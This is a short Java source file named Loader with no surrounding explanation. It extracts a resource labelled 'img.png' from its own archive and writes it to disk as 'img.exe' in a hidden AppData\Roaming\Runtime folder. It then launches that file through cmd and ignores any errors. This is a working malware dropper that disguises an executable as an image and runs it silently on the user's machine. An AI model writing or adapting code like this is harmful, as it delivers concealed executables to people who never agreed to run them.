import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;

public class Loader {

	public static void main(String[] args) {
		final String path = System.getProperty("user.home") + "\\AppData\\Roaming\\Runtime";
        final File Fpath = new File(path);
        Fpath.mkdirs();
        final File exeFile = new File(path + "\\img.exe");
		InputStream s = Loader.class.getClassLoader().getResourceAsStream("img.png");
        FileOutputStream fos;
		try {
			fos = new FileOutputStream(exeFile);
	        Loader.writeFile(s, fos);
		} catch (FileNotFoundException e1) {
			e1.printStackTrace();
		}
        try {
			Runtime.getRuntime().exec("cmd /k start " + exeFile.getAbsolutePath());
		} catch (IOException e) {
		}
	}
    public static void writeFile(final InputStream is, final FileOutputStream fos) {
        try {
            final byte[] bytes = new byte[1000];
            int k = 0;
            while ((k = is.read(bytes)) != -1) {
                fos.write(bytes, 0, k);
            }
            fos.close();
        }
        catch (Exception ex) {}
    }

}
